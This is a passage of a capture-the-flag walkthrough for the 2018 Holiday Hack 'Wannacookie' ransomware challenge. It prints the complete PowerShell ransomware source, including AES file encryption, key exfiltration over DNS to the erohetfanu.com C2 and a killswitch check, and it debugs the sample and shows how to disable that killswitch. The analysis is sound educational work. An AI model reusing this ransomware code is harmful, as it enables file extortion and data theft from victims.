  foreach ($j in $chunks) { if ($chunks.IndexOf($j) -eq 0) { $n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings } else { $(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings } }
  return $n_c_id }
function wanc { $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"
  if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) { return }
  if ($(netstat -ano | Select-String "127.0.0.1:8080").Length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") { return }
  $p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")))
  $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 })
  $h_k = $(B2H $b_k)
  $k_h = $(sh1 $h_k)
  $p_k_e_k = (p_k_e $b_k $p_k).ToString()
  $c_id = (snd_k $p_k_e_k)
  $d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n")
  [array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'),$($env:userprofile + '\Documents'),$($env:userprofile + '\Videos'),$($env:userprofile + '\Pictures'),$($env:userprofile + '\Music')) -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName })
  e_n_d $b_k $f_c $true
  Clear-Variable -Name "h_k"
  Clear-Variable -Name "b_k"
  $lurl = 'http://127.0.0.1:8080/'
  $html_c = @{ 'GET /' = $(g_o_dns (A2H "source.min.html"))
    'GET /close' = '<p>Bye!</p>' }
  Start-Job -ScriptBlock { param($url)
    Start-Sleep 10
    Add-Type -AssemblyName System.Windows.Forms
    Start-Process "$url" -WindowStyle Maximized
    Start-Sleep 2
    [System.Windows.Forms.SendKeys]::SendWait("{F11}") } -Arg $lurl
  $list = New-Object System.Net.HttpListener
  $list.Prefixes.Add($lurl)
  $list.Start()
  try { $close = $false
    while ($list.IsListening) { $context = $list.GetContext()
      $Req = $context.Request
      $Resp = $context.Response
      $recvd = '{0} {1}' -f $Req.httpmethod,$Req.url.localpath
      if ($recvd -eq 'GET /') { $html = $html_c[$recvd] } elseif ($recvd -eq 'GET /decrypt') { $akey = $Req.QueryString.Item("key")
        if ($k_h -eq $(sh1 $akey)) { $akey = $(H2B $akey)
          [array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse -Filter *.wannacookie | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName })
          e_n_d $akey $f_c $false
          $html = "Files have been decrypted!"
          $close = $true } else { $html = "Invalid Key!" } } elseif ($recvd -eq 'GET /close') { $close = $true
        $html = $html_c[$recvd] } elseif ($recvd -eq 'GET /cookie_is_paid') { $c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings
        if ($c_n_k.Length -eq 32) { $html = $c_n_k } else { $html = "UNPAID|$c_id|$d_t" } } else { $Resp.statuscode = 404
        $html = '<h1>404 Not Found</h1>' }
      $buffer = [Text.Encoding]::UTF8.GetBytes($html)
      $Resp.ContentLength64 = $buffer.Length
      $Resp.OutputStream.Write($buffer,0,$buffer.Length)
      $Resp.Close()
      if ($close) { $list.Stop()
        return } } } finally { $list.Stop() } }
wanc
```

We can see that toward the end of the file, the `wanc` function is being called and I would assume that it's the malware main function - so let's analyze that!

```powershell
function wanc { $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"
  if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) { return }
  if ($(netstat -ano | Select-String "127.0.0.1:8080").Length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") { return }
  $p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")))
  $b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 })
  $h_k = $(B2H $b_k)
  $k_h = $(sh1 $h_k)
  $p_k_e_k = (p_k_e $b_k $p_k).ToString()
  $c_id = (snd_k $p_k_e_k)
  $d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n")
  [array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'),$($env:userprofile + '\Documents'),$($env:userprofile + '\Videos'),$($env:userprofile + '\Pictures'),$($env:userprofile + '\Music')) -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName })
  e_n_d $b_k $f_c $true
  Clear-Variable -Name "h_k"
  Clear-Variable -Name "b_k"
  $lurl = 'http://127.0.0.1:8080/'
  $html_c = @{ 'GET /' = $(g_o_dns (A2H "source.min.html"))
    'GET /close' = '<p>Bye!</p>' }
  Start-Job -ScriptBlock { param($url)
    Start-Sleep 10
    Add-Type -AssemblyName System.Windows.Forms
    Start-Process "$url" -WindowStyle Maximized
    Start-Sleep 2
    [System.Windows.Forms.SendKeys]::SendWait("{F11}") } -Arg $lurl
  $list = New-Object System.Net.HttpListener
  $list.Prefixes.Add($lurl)
  $list.Start()
  try { $close = $false
    while ($list.IsListening) { $context = $list.GetContext()
      $Req = $context.Request
      $Resp = $context.Response
      $recvd = '{0} {1}' -f $Req.httpmethod,$Req.url.localpath
      if ($recvd -eq 'GET /') { $html = $html_c[$recvd] } elseif ($recvd -eq 'GET /decrypt') { $akey = $Req.QueryString.Item("key")
        if ($k_h -eq $(sh1 $akey)) { $akey = $(H2B $akey)
          [array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse -Filter *.wannacookie | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName })
          e_n_d $akey $f_c $false
          $html = "Files have been decrypted!"
          $close = $true } else { $html = "Invalid Key!" } } elseif ($recvd -eq 'GET /close') { $close = $true
        $html = $html_c[$recvd] } elseif ($recvd -eq 'GET /cookie_is_paid') { $c_n_k = $(Resolve-DnsName -Server erohetfanu.com -Name ("$c_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings
        if ($c_n_k.Length -eq 32) { $html = $c_n_k } else { $html = "UNPAID|$c_id|$d_t" } } else { $Resp.statuscode = 404
        $html = '<h1>404 Not Found</h1>' }
      $buffer = [Text.Encoding]::UTF8.GetBytes($html)
      $Resp.ContentLength64 = $buffer.Length
      $Resp.OutputStream.Write($buffer,0,$buffer.Length)
      $Resp.Close()
      if ($close) { $list.Stop()
        return } } } finally { $list.Stop() } }
wanc
```

After starting from the top of the function and working my way down, I notice the second line of the malware to be very intresting.

```powershell
if  ($null  -ne  ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString()  -ErrorAction 0 -Server 8.8.8.8)))  {  return  }
```

Basically what this command does is it attempts to resolve a DNS query against some kind of domain. If that query doesn't return a `null` value (because `-ne` in powershell means `not equal to`), then the function will [return](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_return?view=powershell-6), which means that it exits the current scope of the function.

Once the function exits, it executes the following line. 

```powershell
return  }  }  }  finally  {  $list.Stop()  }  }
```

This line executes another `return` function and exits execution of the `wanc` function - thus initially killing the malware's execution.

So this is our killswitch! We can also verify this by converting the hex value of `6B696C6C737769746368` from the DNS request to ascii. 

```powershell
PS C:\Users\User\Desktop> $hex = "6B696C6C737769746368"
PS C:\Users\User\Desktop> -join($hex-split"(..)"|?{$_}|%{[char][convert]::ToByte($_,16)})
killswitch
```

So, this method is pretty interesting as to how the killswitch domain is generated. 

First the command sends a DNS TXT query to the killswitch domain and receives a response.

```powershell
$(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT)
```

The response from the killswitch domain is then used in the other portion of the command, along with the hard coded key in the `$S1` parameter to generate the domain name and converts it to string. 

```powershell
$(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(kill-switch-key).Strings))).ToString()
```

So there's two way we can get the killswitch domain. The hard way by setting breakpoints, and debugging each of the variables for the malware. Or the easy way!

I prefer to do this the easy way!

So to start, let's go ahead and open up the `source.ps1` file in [Powershell ISE](https://docs.microsoft.com/en-us/powershell/scripting/components/ise/introducing-the-windows-powershell-ise?view=powershell-6) by right clicking on it and selecting `Edit`.

Once the script is open, scroll down until we get to the killswitch command. Click on that line (in my case it's line 105) and press `F9` to set a breakpoint. 

You should see the line highlight itself in a reddish/brown color.

<a href="/images/hh18-97.png"><img src="/images/hh18-97.png"></a></p>

Now that we have our breakpoint set, press `F5` to allow the malware to start it's execution. You should see the following information come up in the debugging console below.

```powershell
PS C:\Users\User\Desktop\Wannacookie> C:\Users\User\Desktop\Wannacookie\source.ps1

Hit Line breakpoint on 'C:\Users\User\Desktop\Wannacookie\source.ps1:105'
[DBG]: PS C:\Users\User\Desktop\Wannacookie>> 
```

Alright, so now that we hit the breakpoint, we have complete control of the scripts execution. Meaning, that we can call all the functions and variables that are coded in the malware.

So, let's quickly rewrite the killswitch DNS resolution, to write out the DNS name to file instead of querying it.

We can then execute the command in the debugging console below.

```powershell
[DBG]: PS C:\Users\User\Desktop\Wannacookie>> $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))) | Out-File kill.ps1

[DBG]: PS C:\Users\User\Desktop\Wannacookie>> ls


    Directory: C:\Users\User\Desktop\Wannacookie


Mode                LastWriteTime         Length Name                                                                                                                    
----                -------------         ------ ----                                                                                                                    
d-----       12/27/2018   5:40 PM                forensic_artifacts                                                                                                      
-a----       12/17/2018   9:46 AM         108889 CHOCOLATE_CHIP_COOKIE_RECIPE.docm                                                                                                                                                                                                   
-a----       12/28/2018   2:18 PM            938 dropper.ps1
-a----       12/28/2018   8:06 PM          17754 source.ps1                                                                                                                                                                                                                         
-a----       12/28/2018   8:10 PM             38 kill.ps1
```

Awesome! Now that we have the file, all that's left to do is type it out to the screen.

```powershell
[DBG]: PS C:\Users\User\Desktop\Wannacookie>> type .\kill.ps1
yippeekiyaa.aaay
```

We got the killswitch domain! From here just press `Shift + F5` to stop debugging the powershell script.

From there, return back to KringleCon and access the __HoHoHo Daddy__ console. You should be presented with the following screen.

<p align="center"><a href="/images/hh18-98.png"><img src="/images/hh18-98.png"></a></p>

From there, just enter `yippeekiyaa.aaay` and press `Register`.

<p align="center"><a href="/images/hh18-99.png"><img src="/images/hh18-99.png"></a></p>

After successfully registering the domain, we can return to our badge, and enter "__Successfully registered yippeekiyaa.aaay__" to complete this portion of the objective.

<p align="center"><a href="/images/hh18-100.png"><img src="/images/hh18-100.png"></a></p>

We can now talk to Alabaster again to move on to the final challenge for this objective.

#### Recover Alabaster's Password

After talking to Alabaster again once we registered the killswitch domain, we learn that Alabaster want's us to help recover his passwords from the encrypted database by using the memory dump in the [zip](https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip) file.

<p align="center"><a href="/images/hh18-101.png"><img src="/images/hh18-101.png"></a></p>

Upon extracting the zip file, we should have two files. Alabaster's encrypted database, and the memory dump file.

```powershell
PS C:\Users\User\Desktop\Wannacookie\forensic_artifacts> ls

Directory: C:\Users\User\Desktop\Wannacookie\forensic_artifacts

Mode  LastWriteTime  Length Name
----  -------------  ------ ----
d-----  12/27/2018  11:51 AM  power_dump
-a----  11/9/2018  7:25 AM  16420 alabaster_passwords.elfdb.wannacookie
-a----  11/9/2018  7:50 AM  427762187 powershell.exe_181109_104716.dmp
```

At the same time, we get three hints. One on using [power_dump](https://github.com/chrisjd20/power_dump) to extract strings from memory, and another one on the possibility of a [non-minified](https://softwareengineering.stackexchange.com/questions/232586/what-is-the-real-difference-between-a-minified-and-uncompressed-file-what-are-t) version of the source being available, with a small hint in the title on the usage of [Public/Private Key Encryption](https://en.wikipedia.org/wiki/Public-key_cryptography).

<p align="center"><a href="/images/hh18-102.png"><img src="/images/hh18-102.png"></a></p>

<p align="center"><a href="/images/hh18-103.png"><img src="/images/hh18-103.png"></a></p>

Now before we being this portion, let me explain what we need to do. So, we have a [memory dump](https://www.howtogeek.com/196672/windows-memory-dumps-what-exactly-are-they-for/) provided to us by Alabaster. In this dump we should be able to retrieve the key, or part of the key used to encrypt his documents. Reason why this is possible is due to the fact that certain malware, also called [fileless-malware](https://www.cybereason.com/blog/fileless-malware), only resides in memory (RAM) and not on the disk. This makes the malware way more stealthier and dangerous as certain AV vendors don't detect [in-memory attacks](https://www.csoonline.com/article/3227046/malware/what-is-a-fileless-attack-how-hackers-invade-systems-without-installing-software.html).

Now, even though the malware resides in memory and leaves little to no forensic evidence on the disk, that doesn't bode true for the memory. If we are able to get a "snaphsot" of the current memory process during or after malware execution and before rebooting the computer (because RAM is [volatile](https://whatis.techtarget.com/definition/volatile-memory) and get's cleared on reboot), then we have a change to possibly capture forensics evidence in-memory that can help us find encryption keys, or other command calls to understand the malware.

This is why we will use power dump to search for certain strings in the memory dump. So, now that we understand that, let's go ahead and try to understand what the malware is doing so that we know what we need to look for in memory to help us decrypt the file.

We know that there is a possibility of a non-minified version of the source code being available. We also know from our previous analysis that the malware uses hex representation of strings to communicate with the C2 server. 

Looking into the dropper we also know that `77616E6E61636F6F6B69652E6D696E2E707331` directly reflects the string `wannacookie.min.ps1` and that's what's used to pull the source code. So, what's the chances that we can edit this to remove the `min` part? Can we get the full non-minified source code then? Let's see!

```powershell
PS C:\Users\User> echo "wannacookie.ps1" | Format-Hex


           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   77 61 6E 6E 61 63 6F 6F 6B 69 65 2E 70 73 31     wannacookie.ps1
```

So after converting `wannacookie.ps` to hex, we get `77616E6E61636F6F6B69652E6D696E2E707331`.

Let's edit the dropper with this hexadecimal representation and see if we can't get the full source code.

```powershell
function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616e6e61636f6f6b69652e707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; ($(H2A $h | Out-string)) | Out-File source-non-min.ps1
```

Once we execute that, we should see the new source code in a file called `source-non-min.ps1`!

```powershell
PS C:\Users\User\Desktop\Wannacookie>> ls


    Directory: C:\Users\User\Desktop\Wannacookie


Mode                LastWriteTime         Length Name                                                                                                                    
----                -------------         ------ ----                                                                                                                    
d-----       12/27/2018   5:40 PM                forensic_artifacts                                                                                                      
-a----       12/17/2018   9:46 AM         108889 CHOCOLATE_CHIP_COOKIE_RECIPE.docm                                                                                                                                                                                                   
-a----       12/28/2018   2:18 PM            938 dropper.ps1
-a----       12/28/2018   8:06 PM          17754 source.ps1  
-a----  	 12/28/2018   8:18 PM  		   21094 source-non-min.ps1                                                                                                                                                                                                                       
-a----       12/28/2018   8:10 PM             38 kill.ps1
```

Upon looking into the source code, we can see that it's much cleaner and the variables are better defined. Allowing us to easier understand what each function does and how the malware functions.

```powershell
$functions = {
    function Enc_Dec-File($key, $File, $enc_it) {
        [byte[]]$key = $key
        $Suffix = "`.wannacookie"
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography')
        [System.Int32]$KeySize = $key.Length*8
        $AESP = New-Object 'System.Security.Cryptography.AesManaged'
        $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AESP.BlockSize = 128
        $AESP.KeySize = $KeySize
        $AESP.Key = $key
        $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open)
        if ($enc_it) {$DestFile = $File + $Suffix} else {$DestFile = ($File -replace $Suffix)}
        $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create)
        if ($enc_it) {
            $AESP.GenerateIV()
            $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4)
            $FileSW.Write($AESP.IV, 0, $AESP.IV.Length)
            $Transform = $AESP.CreateEncryptor()
        } else {
            [Byte[]]$LenIV = New-Object Byte[] 4
            $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileSR.Read($LenIV,  0, 3) | Out-Null
            [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
            [Byte[]]$IV = New-Object Byte[] $LIV
            $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null
            $FileSR.Read($IV, 0, $LIV) | Out-Null
            $AESP.IV = $IV
            $Transform = $AESP.CreateDecryptor()
        }
        $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
        [Int]$Count = 0
        [Int]$BlockSzBts = $AESP.BlockSize / 8
        [Byte[]]$Data = New-Object Byte[] $BlockSzBts
        Do
        {
            $Count = $FileSR.Read($Data, 0, $BlockSzBts)
            $CryptoS.Write($Data, 0, $Count)
        }
        While ($Count -gt 0)
        $CryptoS.FlushFinalBlock()
        $CryptoS.Close()
        $FileSR.Close()
        $FileSW.Close()
        Clear-variable -Name "key"
        Remove-Item $File
    }
}
function H2B {
    param($HX)
    $HX = $HX -split '(..)' | ? { $_ }
    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
}

function A2H(){
    Param($a)
    $c = ''
    $b = $a.ToCharArray();
    Foreach ($element in $b) {
        $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    }
    return $c -replace ' '
}

function H2A() {
    Param($a)
    $outa
    $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_}
    return $outa
}
function B2H {
    param($DEC)
    $tmp = ''
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value
        if ($a.length -eq 1){
            $tmp += '0' + $a
        } else {
            $tmp += $a
        }
    }
    return $tmp
}
function ti_rox {
    param($b1, $b2)
    $b1 = $(H2B $b1)
    $b2 = $(H2B $b2)
    $cont = New-Object Byte[] $b1.count
    if ($b1.count -eq $b2.count) {
        for($i=0; $i -lt $b1.count ; $i++)
        {
            $cont[$i] = $b1[$i] -bxor $b2[$i]
        }   
    }
    return $cont
}
function B2G {
    param([byte[]]$Data)
    Process {
    $out = [System.IO.MemoryStream]::new()
    $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress)

      $gStream.Write($Data, 0, $Data.Length)
      $gStream.Close()
    return $out.ToArray()
  }

}
function G2B {
param([byte[]]$Data)
	Process {
        $SrcData = New-Object System.IO.MemoryStream( , $Data )
	    $output = New-Object System.IO.MemoryStream
        $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress)
	    $gStream.CopyTo( $output )
        $gStream.Close()
		$SrcData.Close()
		[byte[]] $byteArr = $output.ToArray()
        return $byteArr
    }
}
function Sha1([String] $String) {
    $SB = New-Object System.Text.StringBuilder
        [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
        [Void]$SB.Append($_.ToString("x2"))
    }
    $SB.ToString()
}

function Pub_Key_Enc($key_bytes, [byte[]]$pub_bytes){
     $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
     $cert.Import($pub_bytes)
     $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true)
     return $(B2H $encKey)
}
function enc_dec {
    param($key, $allfiles, $make_cookie )
    $tcount = 12
    for ( $file=0; $file -lt $allfiles.length; $file++  ) {
        while ($true) {
            $running = @(Get-Job | Where-Object { $_.State -eq 'Running' })
            if ($running.Count -le $tcount) {
                Start-Job  -ScriptBlock {
                    param($key, $File, $true_false)
                    try{
                        Enc_Dec-File $key $File $true_false
                    } catch {
                        $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
                    }
                } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions
                break
            } else {
                Start-Sleep -m 200
                continue
            }
        }
    }
}

function get_over_dns($f) {
    $h = ''
    foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
        $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
    }
    return (H2A $h)
}
function split_to_chunks($astring, $size=32) {
    $new_arr = @()
    $chunk_index=0
    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += @($astring.substring($chunk_index,$size))
        $chunk_index += $size
    }
    return $new_arr
}
function send_key($encrypted_key) {
    $chunks = (split_to_chunks $encrypted_key )
    foreach ($j in $chunks) {
        if ($chunks.IndexOf($j) -eq 0) {
            $new_cookie = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        } else {
            $(Resolve-DnsName -Server erohetfanu.com -Name "$new_cookie.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        }
    }
    return $new_cookie
}
function wannacookie {
    $S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"
    #if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return} 
    #if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") {return}
    $pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
    $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
    $Hex_key = $(B2H $Byte_key)
    $Key_Hash = $(Sha1 $Hex_key)
    $Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
    $cookie_id = (send_key $Pub_key_encrypted_Key)
    $date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n")
    [array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
    enc_dec $Byte_key $future_cookies $true
    Clear-variable -Name "Hex_key"
    Clear-variable -Name "Byte_key"
    $lurl = 'http://127.0.0.1:8080/'
    $htmlcontents = @{
        'GET /'  =  $(Get-Content "source.min.html")
        'GET /close'  =  '<p>Bye!</p>'
    }
    Start-Job -ScriptBlock{
        param($url)
            Start-Sleep 10
            Add-type -AssemblyName System.Windows.Forms
            start-process "$url" -WindowStyle Maximized
            Start-sleep 2
            [System.Windows.Forms.SendKeys]::SendWait("{F11}")
    } -Arg $lurl
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add($lurl)
    $listener.Start()
    try {
        $close = $false
        while ($listener.IsListening) {
            $context = $listener.GetContext()
            $Req = $context.Request
            $Resp = $context.Response
            $Resp.Headers.Add("Access-Control-Allow-Origin","*")
            $received = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath
            if ($received -eq 'GET /') {
                $html = $htmlcontents[$received]
            } elseif ($received -eq 'GET /decrypt') {
                $akey = $Req.QueryString.Item("key")
                if ($Key_Hash -eq $(Sha1 $akey)) {
                    $akey = $(H2B $akey)
                    [array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
                    enc_dec $akey $allcookies $false
                    $html = "Files have been decrypted!"
                    $close = $true
                } else {
                    $html = "Invalid Key!"
                }
            } elseif ($received -eq 'GET /close') {
                $close = $true
                $html = $htmlcontents[$received]
            } elseif ($received -eq 'GET /cookie_is_paid') {
                $cookie_and_key = $(Resolve-DnsName -Server erohetfanu.com -Name ("$cookie_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings
                if ( $cookie_and_key.length -eq 32 ) {
                    $html = $cookie_and_key
                } else {
                    $html = "UNPAID|$cookie_id|$date_time"
                }
            } else {
                $Resp.statuscode = 404
                $html = '<h1>404 Not Found</h1>'
            }
            $buffer = [Text.Encoding]::UTF8.GetBytes($html)
            $Resp.ContentLength64 = $buffer.length
            $Resp.OutputStream.Write($buffer, 0, $buffer.length)
            $Resp.Close()
            if ($close) {
                $listener.Stop()
                return
            }
        }
    } finally {
        $listener.Stop()
    }    
}
wannacookie
```

You can see I commented out two lines of the malware for the killswitch and domain verification so the malware can execute on my system without exiting. This was done to better analyze the malware and it's function during execution.

To start off, I started digging through the code to find a location where the files are encrypted or decrypted. Luckily for me, I came across the following decryption section in the wanacookie function.

```powershell
            } elseif ($received -eq 'GET /decrypt') {
                $akey = $Req.QueryString.Item("key")
                if ($Key_Hash -eq $(Sha1 $akey)) {
                    $akey = $(H2B $akey)
                    [array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
                    enc_dec $akey $allcookies $false
                    $html = "Files have been decrypted!"
                    $close = $true
                } else {
                    $html = "Invalid Key!"
```

Going through the code we see that if the local web server that is spun up revives a `GET` request to the `/decrypt` URL, it sets the `key` parameter passed through to `$akey`. 

It then takes the [sha1](https://en.wikipedia.org/wiki/SHA-1) hash of that key, and compares it to the `$Key_Hash` variable. If the hashes match, the `$akey` is put through the `H2B` function (which after some guess work turns out to mean `Hex to Bytes`) and converts the key to a [bytes](https://searchstorage.techtarget.com/definition/byte) array. 

Afterwards, that `$akey` bytes array is passed into the `enc_dec` function for file decryption.

Awesome, at least now we know what the malware is using to verify the decryption key - it's the SHA1 hash. So from here all we need to do is do some reverse engineering on how that hash is originally generated, and we can find the key!

Looking back into the malware, right after the killswitch we notice the following.

```powershell
    $pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
    $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
    $Hex_key = $(B2H $Byte_key)
    $Key_Hash = $(Sha1 $Hex_key)
    $Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
    $cookie_id = (send_key $Pub_key_encrypted_Key)
    $date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n")
    [array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
    enc_dec $Byte_key $future_cookies $true
    Clear-variable -Name "Hex_key"
    Clear-variable -Name "Byte_key"
```

We can see that this portion of the code generates the `$Key_Hash` variable used in the comparison! So let's go through the code line by line to better understand how we get there and what occurs after.

In line one, we see a variable called `$pub_key` which utilizes the `get_over_dns` function on the hexadecimal value of `7365727665722E637274`.

```powershell
$pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
```

Converting that hex to a string, we get the following.

```powershell
PS C:\Users\User> $hex = "7365727665722E637274"
PS C:\Users\User> -join($hex-split"(..)"|?{$_}|%{[char][convert]::ToByte($_,16)})
server.crt
```

[Server.crt](https://serverfault.com/questions/224122/what-is-crt-and-key-files-and-how-to-generate-them)? Okay, so apparently the `$pub_key` is pulling the server's public certificate key and setting it to that variable. No idea what it's used for yet, but let's keep digging.

The next line after the public key, we see the variable `$Byte_key` being set.

```powershell
$Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
```

This variable is just setting the byte key with a character array that's 16 bytes (0..15) long of random [unicode](https://www.utf8-chartable.de/unicode-utf8-table.pl?utf8=dec&unicodeinhtml=dec) characters 0-255.

Afterwards, this `$Byte_key` is passed into the `B2H` or (`Bytes to Hex`) function and is converted to a hexadecimal representation. This output is then set to the `$Hex_key` variable.

```powershell
$Hex_key = $(B2H $Byte_key)
```

That hex key is then used to generate the SHA1 hash that the malware uses for verification!

```powershell
$Key_Hash = $(Sha1 $Hex_key)
```

